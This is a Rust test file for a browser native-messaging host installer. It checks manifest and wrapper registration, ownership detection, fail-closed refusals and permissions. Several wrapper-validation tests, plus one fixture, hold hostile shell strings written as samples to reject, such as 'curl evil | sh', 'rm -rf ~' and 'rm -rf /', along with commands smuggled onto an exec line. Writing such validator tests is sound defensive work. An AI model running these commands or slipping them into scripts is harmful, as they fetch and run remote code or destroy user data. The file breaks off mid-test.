use super::*;

/// Unique temp tree per test; removed on drop. Tests only ever touch
/// paths under this root -- never a real browser or user directory.
struct TempTree(PathBuf);

impl TempTree {
    fn new(tag: &str) -> TempTree {
        let root =
            std::env::temp_dir().join(format!("bb-registration-{tag}-{}", std::process::id()));
        let _ = fs::remove_dir_all(&root);
        fs::create_dir_all(&root).unwrap();
        TempTree(root)
    }

    fn path(&self, rel: &str) -> PathBuf {
        // Join per component: pushing a literal "a/b" keeps the "/" on
        // Windows, which breaks string comparison against paths the
        // production code builds with native separators.
        rel.split('/').fold(self.0.clone(), |p, seg| p.join(seg))
    }
}

impl Drop for TempTree {
    fn drop(&mut self) {
        let _ = fs::remove_dir_all(&self.0);
    }
}

fn registrar(tree: &TempTree) -> Registrar {
    // A real file at the host_exe path, so an assess() of what we wrote
    // reports Ok rather than a dangling launch path.
    let exe = tree.path("bin/chromium-bridge");
    fs::create_dir_all(exe.parent().unwrap()).unwrap();
    fs::write(&exe, "#!/bin/sh\n").unwrap();
    Registrar {
        host_exe: exe,
        install_dir: tree.path("install"),
        scope: Scope::User,
        system_root: tree.path("sys"),
        extension_id: PINNED_EXTENSION_ID.to_string(),
    }
}

/// Base dirs rooted in the tree: `home/` for the account, `sys/` for the machine (`sys/etc`, `sys/opt`,
/// `sys/Applications`, ...), so a system-scope registration lands in the fixture, never in `/etc`.
fn tree_dirs(tree: &TempTree) -> BaseDirs {
    BaseDirs {
        home: tree.path("home"),
        xdg_config_home: None,
        xdg_data_home: None,
        local_app_data: None,
        roaming_app_data: None,
        program_files: None,
        system_root: tree.path("sys"),
    }
}

fn browser_target(tree: &TempTree) -> Target {
    Target {
        label: Some(Browser::Chrome),
        name: "chrome".into(),
        registration: Registration::ManifestDir(tree.path("nm/chrome/NativeMessagingHosts")),
        pointer: None,
    }
}

/// The macOS shape, through the resolver: the pointer file sits beside the
/// manifest dir, under the browser's user data root.
fn macos_target(tree: &TempTree) -> Target {
    Target::for_browser(
        &browsers::entry(Os::MacOs, &tree_dirs(tree), Browser::Chrome),
        Scope::User,
    )
}

fn pointer_path(target: &Target) -> PathBuf {
    match &target.pointer {
        Some(ExtensionPointer::File(path)) => path.clone(),
        other => panic!("expected a pointer file, got {other:?}"),
    }
}

#[test]
fn register_writes_the_pointer_chrome_reads_and_uninstall_removes_it_with_the_manifest() {
    // The pointer's bytes are what Chrome's preferences loader parses, and the Web Store is the only
    // update source it accepts on macOS and Windows.
    let tree = TempTree::new("pointer");
    let reg = registrar(&tree);
    let target = macos_target(&tree);
    let lines = reg.register(&target).unwrap();
    let pointer = pointer_path(&target);
    assert_eq!(
        fs::read_to_string(&pointer).unwrap(),
        "{\n  \"external_update_url\": \"https://clients2.google.com/service/update2/crx\"\n}\n"
    );
    assert_eq!(
        assess_pointer(target.pointer.as_ref().unwrap()),
        PointerState::Ok
    );
    assert!(
        lines.iter().any(|l| l.contains("extension pointer")),
        "{lines:?}"
    );
    // Idempotent over our own pointer.
    reg.register(&target).unwrap();

    let (lines, errors) = Registrar::uninstall(&target);
    assert!(errors.is_empty(), "{errors:?}");
    assert!(lines[0].contains("removed manifest"), "{lines:?}");
    assert!(lines[1].contains("removed extension pointer"), "{lines:?}");
    assert!(!pointer.exists());
    assert!(!target.registration.manifest_path().exists());
    assert_eq!(
        assess_pointer(target.pointer.as_ref().unwrap()),
        PointerState::Missing
    );
    // A second uninstall reports nothing to do, for both.
    assert_eq!(
        Registrar::uninstall(&target),
        (vec!["chrome: not registered".to_string()], vec![])
    );
}

#[test]
fn foreign_pointer_blocks_register_and_is_left_alone_by_uninstall() {
    // Fail closed before any write: a pointer this project did not write means another installer
    // owns the slot, so register writes nothing, not even the manifest. uninstall still removes a
    // manifest of ours beside it and refuses only the pointer, so nothing of ours survives to dangle
    // once the wrappers go.
    let tree = TempTree::new("foreign-pointer");
    let reg = registrar(&tree);
    let target = macos_target(&tree);
    let pointer = pointer_path(&target);
    fs::create_dir_all(pointer.parent().unwrap()).unwrap();
    // Our update url beside a key this project never writes: the closest foreign shape.
    let foreign = r#"{"external_update_url":"https://clients2.google.com/service/update2/crx","supported_locales":["en"]}"#;
    fs::write(&pointer, foreign).unwrap();

    let err = reg.register(&target).unwrap_err();
    assert!(
        err.contains("refusing to overwrite extension pointer"),
        "{err}"
    );
    assert!(!target.registration.manifest_path().exists());
    assert!(matches!(
        assess_pointer(target.pointer.as_ref().unwrap()),
        PointerState::Foreign(_)
    ));

    fs::remove_file(&pointer).unwrap();
    reg.register(&target).unwrap();
    fs::write(&pointer, foreign).unwrap();
    let (lines, errors) = Registrar::uninstall(&target);
    assert!(lines[0].contains("removed manifest"), "{lines:?}");
    assert!(
        errors[0].contains("refusing to remove extension pointer"),
        "{errors:?}"
    );
    assert!(!target.registration.manifest_path().exists());
    assert_eq!(fs::read_to_string(&pointer).unwrap(), foreign);
}

#[test]
fn register_writes_manifest_and_labeled_wrapper() {
    let tree = TempTree::new("register");
    let reg = registrar(&tree);
    let target = browser_target(&tree);
    // The manifest dir does not exist yet -- a freshly installed browser
    // may not have created its config tree either. Registration creates
    // it; an undetected-but-real browser stays registrable.
    assert!(!target
        .registration
        .manifest_path()
        .parent()
        .unwrap()
        .exists());
    reg.register(&target).unwrap();

    let manifest_path = target.registration.manifest_path();
    let manifest: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&manifest_path).unwrap()).unwrap();
    assert_eq!(manifest["name"], crate::identity::NATIVE_HOST_ID);
    assert_eq!(manifest["type"], "stdio");
    assert_eq!(
        manifest["allowed_origins"][0],
        format!(
            "chrome-extension://{}/",
            crate::identity::PINNED_EXTENSION_ID
        )
    );
    let wrapper = PathBuf::from(manifest["path"].as_str().unwrap());
    assert_eq!(wrapper, tree.path("install/run-host-chrome.sh"));
    let script = fs::read_to_string(&wrapper).unwrap();
    assert!(wrapper_is_ours(&script), "{script}");
    assert!(script.contains("--label 'chrome'"));
    assert!(script.contains(&*tree.path("bin/chromium-bridge").to_string_lossy()));

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(&wrapper).unwrap().permissions().mode() & 0o777;
        assert_eq!(mode, 0o755);
        let dir_mode = fs::metadata(tree.path("install"))
            .unwrap()
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(dir_mode, 0o700);
    }
}

#[test]
fn register_is_idempotent_and_uninstall_reverses_it() {
    let tree = TempTree::new("roundtrip");
    let reg = registrar(&tree);
    let target = browser_target(&tree);
    reg.register(&target).unwrap();
    // Second run overwrites our own artifacts without complaint.
    reg.register(&target).unwrap();
    assert_eq!(assess(&target.registration), RegState::Ok);

    let (lines, errors) = Registrar::uninstall(&target);
    assert!(errors.is_empty(), "{errors:?}");
    assert!(lines[0].contains("removed manifest"), "{lines:?}");
    assert!(!target.registration.manifest_path().exists());
    assert_eq!(assess(&target.registration), RegState::Missing);
    // Uninstall again: cleanly reports nothing to do.
    let (lines, errors) = Registrar::uninstall(&target);
    assert!(errors.is_empty(), "{errors:?}");
    assert!(lines[0].contains("not registered"), "{lines:?}");

    let (removed, errors) = remove_wrappers(&tree.path("install"));
    assert_eq!(removed.len(), 1, "{removed:?}");
    assert!(errors.is_empty(), "{errors:?}");
    assert!(!tree.path("install/run-host-chrome.sh").exists());
    // The now-empty install dir is dropped too.
    assert!(!tree.path("install").exists());
}

#[test]
fn assess_flags_a_dangling_launch_path_as_stale() {
    let tree = TempTree::new("stale");
    let reg = registrar(&tree);
    let target = browser_target(&tree);
    reg.register(&target).unwrap();
    // Simulate the binary/wrapper disappearing (moved binary, wiped dir).
    fs::remove_file(tree.path("install/run-host-chrome.sh")).unwrap();
    let state = assess(&target.registration);
    let RegState::Stale(why) = state else {
        panic!("expected Stale, got {state:?}");
    };
    assert!(why.contains("launch path missing"), "{why}");
    // --fix's engine repairs it in place.
    reg.register(&target).unwrap();
    assert_eq!(assess(&target.registration), RegState::Ok);
}

#[test]
fn explicit_dir_gets_the_unlabeled_wrapper() {
    let tree = TempTree::new("explicit");
    let reg = registrar(&tree);
    let target = Target::for_explicit_dir(&tree.path("custom"));
    reg.register(&target).unwrap();
    let manifest: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(target.registration.manifest_path()).unwrap())
            .unwrap();
    assert_eq!(
        manifest["path"].as_str().unwrap(),
        tree.path("install/run-host.sh").to_string_lossy()
    );
    let script = fs::read_to_string(tree.path("install/run-host.sh")).unwrap();
    assert!(!script.contains("--label"));
}

#[test]
fn foreign_manifest_is_never_overwritten_or_removed() {
    let tree = TempTree::new("foreign");
    let reg = registrar(&tree);
    let target = browser_target(&tree);
    let manifest_path = target.registration.manifest_path();
    fs::create_dir_all(manifest_path.parent().unwrap()).unwrap();
    let foreign =
        r#"{"name":"com.other.host","description":"someone else","path":"/x","type":"stdio"}"#;
    fs::write(&manifest_path, foreign).unwrap();

    let err = reg.register(&target).unwrap_err();
    assert!(err.contains("refusing to overwrite"), "{err}");
    let (lines, errors) = Registrar::uninstall(&target);
    assert!(lines.is_empty(), "{lines:?}");
    assert!(errors[0].contains("refusing to remove"), "{errors:?}");
    // Fail closed: the file is byte-identical afterwards.
    assert_eq!(fs::read_to_string(&manifest_path).unwrap(), foreign);
    assert!(matches!(assess(&target.registration), RegState::Foreign(_)));
}

#[test]
fn unreadable_manifest_path_fails_closed() {
    // Two entries that are not a readable file: a directory, and a dangling symlink, which reads as
    // NotFound like an empty slot although replacing it would destroy an entry nobody verified.
    // Neither register nor uninstall may proceed, and the entry stays.
    let tree = TempTree::new("unreadable");
    let reg = registrar(&tree);
    type Plant = fn(&Path);
    fn directory(p: &Path) {
        fs::create_dir_all(p).unwrap();
    }
    #[cfg(unix)]
    fn dangling_symlink(p: &Path) {
        let dir = p.parent().unwrap();
        fs::create_dir_all(dir).unwrap();
        std::os::unix::fs::symlink(dir.join("gone"), p).unwrap();
    }
    #[cfg(unix)]
    let planted: Vec<(&str, Plant)> = vec![
        ("directory", directory),
        ("dangling-symlink", dangling_symlink),
    ];
    #[cfg(not(unix))]
    let planted: Vec<(&str, Plant)> = vec![("directory", directory)];
    for (case, plant) in planted {
        let target = Target {
            label: Some(Browser::Chrome),
            name: "chrome".into(),
            registration: Registration::ManifestDir(
                tree.path(&format!("nm/{case}/NativeMessagingHosts")),
            ),
            pointer: None,
        };
        let manifest = target.registration.manifest_path();
        plant(&manifest);

        let err = reg.register(&target).unwrap_err();
        assert!(err.contains("cannot verify"), "{case}: {err}");
        let (lines, errors) = Registrar::uninstall(&target);
        assert!(lines.is_empty(), "{case}: {lines:?}");
        assert!(errors[0].contains("left in place"), "{case}: {errors:?}");
        assert!(
            fs::symlink_metadata(&manifest).is_ok(),
            "{case}: entry gone"
        );
        assert!(
            matches!(assess(&target.registration), RegState::Unreadable(_)),
            "{case}"
        );
    }
}

#[test]
fn ownership_is_exact_description_match() {
    // install.sh wrote this exact description (no marker suffix).
    let legacy = format!(
        r#"{{"name":"{NATIVE_HOST_ID}","description":"Chromium Bridge native messaging host","path":"/x/run-host.sh","type":"stdio","allowed_origins":["chrome-extension://{PINNED_EXTENSION_ID}/"]}}"#
    );
    assert_eq!(manifest_ownership(&legacy), Ownership::Ours);
    // Same shape under another host id is foreign.
    assert!(matches!(
        manifest_ownership(&legacy.replace(NATIVE_HOST_ID, "com.other.host")),
        Ownership::Foreign(_)
    ));
    // A description that merely STARTS with our prefix is not ours.
    let prefixed = legacy.replace(
        "Chromium Bridge native messaging host",
        "Chromium Bridge native messaging host - unrelated fork",
    );
    assert!(matches!(
        manifest_ownership(&prefixed),
        Ownership::Foreign(_)
    ));
    assert!(matches!(
        manifest_ownership("not json"),
        Ownership::Foreign(_)
    ));
}

#[test]
fn wrapper_ownership_requires_the_exec_trampoline_shape() {
    // Ours (current shape, with marker comment).
    assert!(wrapper_is_ours(
        "#!/usr/bin/env bash\n# managed by chromium-bridge; safe to delete\nexec '/x/chromium-bridge' --native-host --label 'chrome'\n"
    ));
    // Legacy install.sh shape (no comment).
    assert!(wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /x/chromium-bridge --native-host\n"
    ));
    // A script that merely MENTIONS --native-host in a comment is not ours.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\n# --native-host\nrm -rf ~/important\n"
    ));
    // Extra payload beyond the trampoline is not ours.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\ncurl evil | sh\nexec /x/y --native-host\n"
    ));
    // Wrong shebang is not ours.
    assert!(!wrapper_is_ours("#!/bin/sh\nexec /x/y --native-host\n"));
    // Two exec lines are not ours.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /a --native-host\nexec /b --native-host\n"
    ));
    // A compound command smuggled onto the exec line is not ours.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /x --native-host; curl evil | sh\n"
    ));
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /x --native-host && rm -rf ~\n"
    ));
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec $(pick-a-binary) --native-host\n"
    ));
    // Extra argv smuggled between path and flag is not a trampoline.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /bin/sh -c 'touch /tmp/pwn' --native-host\n"
    ));
    // A malformed label is not ours either.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /x --native-host --label 'bad label'\n"
    ));
    // Word expansion (brace, glob, tilde) unquoted is not shell-literal.
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /tmp/{a,b} --native-host\n"
    ));
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /tmp/pwn-* --native-host\n"
    ));
    assert!(!wrapper_is_ours(
        "#!/usr/bin/env bash\nexec ~/other-binary --native-host\n"
    ));
    // Quoted, those same characters are literal and fine.
    assert!(wrapper_is_ours(
        "#!/usr/bin/env bash\nexec '/tmp/odd {dir}/chromium-bridge' --native-host\n"
    ));
    // Legitimate paths with spaces pass, quoted or backslash-escaped.
    assert!(wrapper_is_ours(
        "#!/usr/bin/env bash\nexec '/Users/My Name/.chromium-bridge/chromium-bridge' --native-host --label 'chrome'\n"
    ));
    assert!(wrapper_is_ours(
        "#!/usr/bin/env bash\nexec /Users/My\\ Name/.chromium-bridge/chromium-bridge --native-host\n"
    ));
}

#[test]
fn foreign_wrapper_names_are_left_in_place() {
    let tree = TempTree::new("wrapper");
    let dir = tree.path("install");
    fs::create_dir_all(&dir).unwrap();
    fs::write(dir.join("run-host-chrome.sh"), "#!/bin/sh\nrm -rf /\n").unwrap();
    let (removed, errors) = remove_wrappers(&dir);
    assert!(removed.is_empty());
    assert_eq!(errors.len(), 1);
    assert!(dir.join("run-host-chrome.sh").exists());
}

#[test]
fn shell_quote_defuses_single_quotes() {
    assert_eq!(shell_quote("plain"), "'plain'");
    assert_eq!(shell_quote("a'b"), r"'a'\''b'");
}

#[test]
fn fix_default_targets_only_detected_browsers_but_explicit_keys_always_work() {
    // Fixture tree: Chrome is really installed (app bundle + config
    // root); Vivaldi is a ghost (leftover config root, no app).
    let tree = TempTree::new("select");
    fs::create_dir_all(tree.path("sys/Applications/Google Chrome.app")).unwrap();
    fs::create_dir_all(tree.path("home/Library/Application Support/Google/Chrome")).unwrap();
    fs::create_dir_all(tree.path("home/Library/Application Support/Vivaldi")).unwrap();
    let dirs = tree_dirs(&tree);
    let entries = browsers::resolve(Os::MacOs, &dirs);

    // Default --fix: only the detected browser; the ghost gets no
    // manifest written into its leftover directory.
    let targets = select_targets(&crate::cli::FixTargets::Detected, &entries, Scope::User).unwrap();
    assert_eq!(
        targets.iter().map(|t| t.name.clone()).collect::<Vec<_>>(),
        vec!["chrome"]
    );

    // Explicit --browser: the user's word overrides detection, so a
    // browser we cannot see (non-standard install) stays registrable.
    let targets = select_targets(
        &crate::cli::FixTargets::Browsers(vec![Browser::Vivaldi, Browser::Opera]),
        &entries,
        Scope::User,
    )
    .unwrap();
    assert_eq!(
        targets.iter().map(|t| t.name.clone()).collect::<Vec<_>>(),
        vec!["vivaldi", "opera"]
    );

    // Nothing detected at all: refuse with guidance, never guess.
    let empty_dirs = BaseDirs {
        home: tree.path("empty-home"),
        system_root: tree.path("empty-sys"),
        ..dirs
    };
    let entries = browsers::resolve(Os::MacOs, &empty_dirs);
    assert!(matches!(
        select_targets(&crate::cli::FixTargets::Detected, &entries, Scope::User),
        Err(FixError::NoTargets(_))
    ));
}

/// The .deb's post-install, as root with the vendor packages under `/opt` and no browser run by root:
/// `--fix --system` detects by the install dirs, writes one manifest per system directory into the system
/// roots (Chrome's and Brave's rows share Chrome's directory, so Chrome's manifest once, unlabeled since
/// either browser may launch it, while Vivaldi's own directory keeps its label), a wrapper dir every
/// account can traverse, nothing under any home, and `uninstall --system` reverses it.
#[test]
fn system_scope_registers_into_the_system_roots_once_per_shared_directory() {
    let tree = TempTree::new("system");
    fs::create_dir_all(tree.path("sys/opt/google/chrome")).unwrap();
    fs::create_dir_all(tree.path("sys/opt/brave.com/brave")).unwrap();
    fs::create_dir_all(tree.path("sys/opt/vivaldi")).unwrap();
    let dirs = tree_dirs(&tree);
    let entries = browsers::resolve(Os::Linux, &dirs);
    let install_dir = browsers::install_dir(Os::Linux, &dirs, Scope::System);
    assert_eq!(install_dir, tree.path("sys/var/lib/chromium-bridge"));

    let targets =
        select_targets(&crate::cli::FixTargets::Detected, &entries, Scope::System).unwrap();
    assert_eq!(
        targets.iter().map(|t| t.name.clone()).collect::<Vec<_>>(),
        vec!["chrome", "vivaldi"],
        "Brave reads Chrome's system directory, so the three detected browsers are two manifests"
    );
    // The same collapse under an explicit selection, whichever order the keys come in.
    let explicit = select_targets(
        &crate::cli::FixTargets::Browsers(vec![Browser::Brave, Browser::Chrome, Browser::Vivaldi]),
        &entries,
        Scope::System,
    )
    .unwrap();
    assert_eq!(
        explicit.iter().map(|t| t.name.clone()).collect::<Vec<_>>(),
        vec!["chrome", "vivaldi"]
    );

    let reg = Registrar {
        scope: Scope::System,
        install_dir: install_dir.clone(),
        ..registrar(&tree)
    };
    for target in &targets {
        reg.register(target).unwrap();
    }
    let manifest = tree
        .path("sys/etc/opt/chrome/native-messaging-hosts/com.vivswan.chromium_bridge.host.json");
    let parsed: serde_json::Value =
        serde_json::from_str(&fs::read_to_string(&manifest).unwrap()).unwrap();
    // Chrome's directory is launched by Brave too, so its wrapper carries no label: a label would file
    // Brave's connection in Chrome's slot. Vivaldi's own directory keeps its label.
    let wrapper = install_dir.join("run-host.sh");
    assert_eq!(parsed["path"], wrapper.to_string_lossy().as_ref());
    assert!(!fs::read_to_string(&wrapper).unwrap().contains("--label"));
    let vivaldi: serde_json::Value =
        serde_json::from_str(
            &fs::read_to_string(tree.path(
                "sys/etc/vivaldi/native-messaging-hosts/com.vivswan.chromium_bridge.host.json",
            ))
            .unwrap(),
        )
        .unwrap();
    assert_eq!(
        vivaldi["path"],
        install_dir
            .join("run-host-vivaldi.sh")
            .to_string_lossy()
            .as_ref()
    );
    assert!(fs::read_to_string(install_dir.join("run-host-vivaldi.sh"))
        .unwrap()
        .contains("--label 'vivaldi'"));
    assert_eq!(assess(&targets[0].registration), RegState::Ok);
    assert_eq!(assess(&targets[1].registration), RegState::Ok);
    assert!(
        !tree.path("home").exists(),
        "a system-scope registration wrote under the home directory"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = |p: &Path| fs::metadata(p).unwrap().permissions().mode() & 0o777;
        assert_eq!(
            mode(&install_dir),
            0o755,
            "every account's browser must traverse it"
        );
        assert_eq!(mode(&wrapper), 0o755);
        assert_eq!(mode(&manifest), 0o644);
    }

    // Every created manifest directory is traversable, whatever the umask of the account that ran this.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        for dir in [
            tree.path("sys/etc/opt/chrome/native-messaging-hosts"),
            tree.path("sys/etc/opt/chrome"),
            tree.path("sys/etc/opt"),
        ] {
            let mode = fs::metadata(&dir).unwrap().permissions().mode() & 0o777;
            assert_eq!(mode, 0o755, "{}", dir.display());
        }
    }

    // A system directory someone else made unreachable is refused before any write, never loosened.
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let edge = tree.path("sys/etc/opt/edge");
        fs::create_dir_all(&edge).unwrap();
        fs::set_permissions(&edge, fs::Permissions::from_mode(0o700)).unwrap();
        let target = Target::for_browser(
            entries.iter().find(|e| e.browser == Browser::Edge).unwrap(),
            Scope::System,
        );
        let err = reg.register(&target).unwrap_err();
        assert!(err.contains("not traversable by other accounts"), "{err}");
        assert!(!edge.join("native-messaging-hosts").exists());
        assert!(
            !install_dir.join("run-host-edge.sh").exists(),
            "a refused registration wrote its wrapper"
        );
        fs::set_permissions(&edge, fs::Permissions::from_mode(0o755)).unwrap();
    }

    // On Windows every browser's manifest is the one store file, so the identity is the registry key:
    // nothing collapses there but Opera, which reads Chrome's key.
    let windows = browser_targets(browsers::resolve(Os::Windows, &dirs).iter(), Scope::System);
    assert_eq!(
        windows.iter().map(|t| t.name.clone()).collect::<Vec<_>>(),
        vec!["chrome", "chromium", "brave", "edge", "vivaldi"]
    );

    // doctor rows: Brave's system slot is Chrome's, reported under Chrome's name.
    let brave = entries
        .iter()
        .find(|e| e.browser == Browser::Brave)
        .unwrap();
    assert_eq!(brave.system.owner(), Some(Browser::Chrome));
    assert_eq!(assess(brave.system.registration()), RegState::Ok);
    assert_eq!(assess(&brave.user), RegState::Missing);

    // uninstall --system: every known browser's system target, once per directory, then the wrappers.
    for target in browser_targets(entries.iter(), Scope::System) {
        let (_, errors) = Registrar::uninstall(&target);
        assert!(errors.is_empty(), "{errors:?}");
    }
    let (removed, errors) = remove_wrappers(&install_dir);
    assert_eq!(removed.len(), 2, "{removed:?}");
    assert!(errors.is_empty(), "{errors:?}");
    assert!(!manifest.exists());
    assert!(!install_dir.exists());
}

/// Chromium on Windows selects a manifest through the registry key alone, so the shared store file is
/// not this browser's whatever it holds: without the key it reads missing (and so lets a machine-wide
/// key serve), while a key without its file is ours and stale.
#[test]
fn a_windows_registration_is_its_key() {
    let tree = TempTree::new("classify");
    let launch = tree.path("bin/chromium-bridge");
    fs::create_dir_all(launch.parent().unwrap()).unwrap();
    fs::write(&launch, "").unwrap();
    let ours = format!(r#"{{"path":{:?}}}"#, launch.to_string_lossy());
    let cases: Vec<(&str, Slot, Option<Slot>, RegState)> = vec![
        (
            "file without the key",
            Slot::Ours(ours.clone()),
            Some(Slot::Absent),
            RegState::Missing,
        ),
        (
            "foreign file without the key",
            Slot::Foreign("not JSON".into()),
            Some(Slot::Absent),
            RegState::Missing,
        ),
        (
            "unreadable file without the key",
            Slot::Unreadable("a directory".into()),
            Some(Slot::Absent),
            RegState::Missing,
        ),
        (
            "key without the file",
            Slot::Absent,
            Some(Slot::Ours(String::new())),
            RegState::Stale("manifest file missing but registry key HKCU\\k present".into()),
        ),
        (
            "both, launchable",
            Slot::Ours(ours.clone()),
            Some(Slot::Ours(String::new())),
            RegState::Ok,
        ),
        (
            "a directory registration needs no key",
            Slot::Ours(ours),
            None,
            RegState::Ok,
        ),
        (
            "a foreign key is reported before the file",
            Slot::Ours(String::new()),
            Some(Slot::Foreign("re-pointed".into())),
            RegState::Foreign("re-pointed".into()),
        ),
    ];
    for (case, file, key, expected) in cases {
        assert_eq!(
            classify(ManifestSlots { file, key }, "HKCU\\k"),
            expected,
            "{case}"
        );
    }
}

/// Chromium probes the per-user manifest with an existence check that follows symlinks, so a dangling
/// link there is skipped and the system registration serves, while a directory or a file (ours or not)
/// stops the lookup; `register` still refuses the dangling link as an entry nobody verified.
#[cfg(unix)]
#[test]
fn lookup_hit_follows_chromiums_existence_probe() {
    let tree = TempTree::new("lookup");
    let dir = tree.path("nm");
    fs::create_dir_all(&dir).unwrap();
    let reg = Registration::ManifestDir(dir.clone());
    let manifest = reg.manifest_path();
    assert!(!lookup_hit(&reg), "absent");
    std::os::unix::fs::symlink(dir.join("gone"), &manifest).unwrap();
    assert!(!lookup_hit(&reg), "dangling link");
    assert!(matches!(assess(&reg), RegState::Unreadable(_)));
    fs::remove_file(&manifest).unwrap();
    fs::write(&manifest, "not ours").unwrap();
    assert!(lookup_hit(&reg), "a foreign file");
    fs::remove_file(&manifest).unwrap();
    fs::create_dir(&manifest).unwrap();
    assert!(lookup_hit(&reg), "a directory");
}

/// A machine-wide registration launches as other accounts, so the binary must be readable and executable
/// by them along its whole path: one under a 0700 home reads healthy to `doctor` and fails at launch.
#[cfg(unix)]
#[test]
fn system_scope_refuses_a_binary_other_accounts_cannot_launch() {
    use std::os::unix::fs::PermissionsExt;
    let tree = TempTree::new("launchable");
    let root = tree.path("sys");
    let place = |rel: &str, dir_modes: &[(&str, u32)], file_mode: u32| -> PathBuf {
        let exe = root.join(rel);
        fs::create_dir_all(exe.parent().unwrap()).unwrap();
        fs::write(&exe, "").unwrap();
        fs::set_permissions(&exe, fs::Permissions::from_mode(file_mode)).unwrap();
        for (dir, mode) in dir_modes {
            fs::set_permissions(root.join(dir), fs::Permissions::from_mode(*mode)).unwrap();
        }
        exe
    };
    let cases: Vec<(&str, PathBuf, Option<&str>)> = vec![
        (
            "a package binary",
            place("usr/local/bin/chromium-bridge", &[("usr", 0o755)], 0o755),
            None,
        ),
        (
            "a binary under a private home",
            place(
                "home/user/.local/lib/chromium-bridge/chromium-bridge",
                &[("home/user", 0o700)],
                0o755,
            ),
            Some("home/user is not traversable"),
        ),
        (
            "an owner-only binary in a public directory",
            place(
                "opt/example/chromium-bridge",
                &[("opt/example", 0o755)],
                0o700,
            ),
            Some("chromium-bridge is not readable and executable"),
        ),
    ];
    for (case, exe, refusal) in cases {
        let got = launchable_by_every_account(&exe, &root);
        match refusal {
            None => assert_eq!(got, Ok(()), "{case}"),
            Some(text) => {
                let why = got.expect_err(&format!("{case} must be refused"));
                assert!(why.contains(text), "{case}: {why}");
            }
        }
    }
    // Restore traversal so the tree's cleanup can remove it.
    fs::set_permissions(root.join("home/user"), fs::Permissions::from_mode(0o755)).unwrap();
}

/// Fail closed both ways, the macOS .pkg's root refusal mirrored: a plain account cannot write the system
/// roots, and root (HOME is `/root`, or a sudo caller's with root as the owner of what it writes) must not
/// write a home. Windows elevation keeps the account, so it may write either.
#[test]
fn privilege_admits_exactly_the_scope_it_can_write_correctly() {
    let cases: &[(Privilege, Scope, Result<(), &str>)] = &[
        (Privilege::User, Scope::User, Ok(())),
        (Privilege::User, Scope::System, Err("run it as root (sudo)")),
        (Privilege::Root, Scope::System, Ok(())),
        (Privilege::Root, Scope::User, Err("pass --system")),
        (Privilege::Elevated, Scope::User, Ok(())),
        (Privilege::Elevated, Scope::System, Ok(())),
    ];
    for (privilege, scope, expected) in cases {
        let got = privilege.admit(*scope);
        match expected {
            Ok(()) => assert_eq!(got, Ok(()), "{privilege:?} {scope:?}"),
            Err(hint) => {
                let refusal = got.expect_err(&format!("{privilege:?} {scope:?} must refuse"));
                assert!(refusal.contains(hint), "{privilege:?} {scope:?}: {refusal}");
            }
        }
    }
}

/// The options page shows the host's reason as is, so it names what was looked for and the next step
/// and carries no CLI flag.
#[test]
fn no_targets_reason_reads_as_a_page_sentence() {
    let tree = TempTree::new("no-targets-page");
    let entries = browsers::resolve(Os::MacOs, &tree_dirs(&tree));
    let Err(FixError::NoTargets(reason)) =
        select_targets(&crate::cli::FixTargets::Detected, &entries, Scope::User)
    else {
        panic!("an empty machine must refuse the detected selection");
    };
    assert!(!reason.contains("--"), "{reason}");
    assert!(reason.contains(&known_keys()), "{reason}");
    assert!(reason.contains("install Chrome, Brave or Edge"), "{reason}");
}

/// packaging/deb/postinst accepts exactly exit 3 as "no browser on this machine yet" and lets dpkg
/// configure the package; every other refusal, and clap's usage exit 2, must still fail the install.
#[test]
fn nothing_detected_exits_three_and_every_other_refusal_exits_one() {
    assert_eq!(NOTHING_TO_REGISTER, 3);
    let cases: Vec<(FixError, i32)> = vec![
        (FixError::NoTargets("none".into()), NOTHING_TO_REGISTER),
        (FixError::Environment("no HOME".into()), 1),
        (FixError::Privilege("not root".into()), 1),
        (FixError::HostExe(std::io::Error::other("gone")), 1),
        (FixError::Unlaunchable("0700".into()), 1),
    ];
    for (error, code) in cases {
        assert_eq!(fix_exit_code(&error), code, "{error:?}");
    }
}

/// The CLI (and the installer logs that capture it) gets the same reason with the flags a terminal
/// can act on appended, and nothing else changes.
#[test]
fn cli_guidance_appends_the_flags_to_the_reason_alone() {
    let reason = "no browser (looked for chrome): install Chrome, then repair again".to_string();
    let cli = cli_guidance(&FixError::NoTargets(reason.clone()));
    assert!(cli.starts_with(&reason), "{cli}");
    for flag in ["--browser", "--all", "--manifest-dir"] {
        assert!(cli.contains(flag), "{cli}");
    }
    let other = FixError::Environment("HOME is not set".into());
    assert_eq!(cli_guidance(&other), other.to_string());
}

#[cfg(unix)]
#[test]
fn symlinked_install_dir_is_refused() {
    let tree = TempTree::new("symlink");
    let real = tree.path("elsewhere");
    fs::create_dir_all(&real).unwrap();
    let link = tree.path("install");
    std::os::unix::fs::symlink(&real, &link).unwrap();
    let reg = Registrar {
        host_exe: tree.path("bin/chromium-bridge"),
        install_dir: link,
        scope: Scope::User,
        system_root: tree.path("sys"),
        extension_id: PINNED_EXTENSION_ID.to_string(),
    };
    let target = macos_target(&tree);
    let err = reg.register(&target).unwrap_err();
    assert!(err.contains("symlink"), "{err}");
    // Nothing was written through the link, and no pointer either.
    assert!(fs::read_dir(&real).unwrap().next().is_none());
    assert!(!pointer_path(&target).exists());
}

#[test]
fn registry_targets_fail_closed_off_windows() {
    #[cfg(not(windows))]
    {
        let tree = TempTree::new("registry");
        let reg = registrar(&tree);
        let target = Target {
            label: Some(Browser::Chrome),
            name: "chrome".into(),
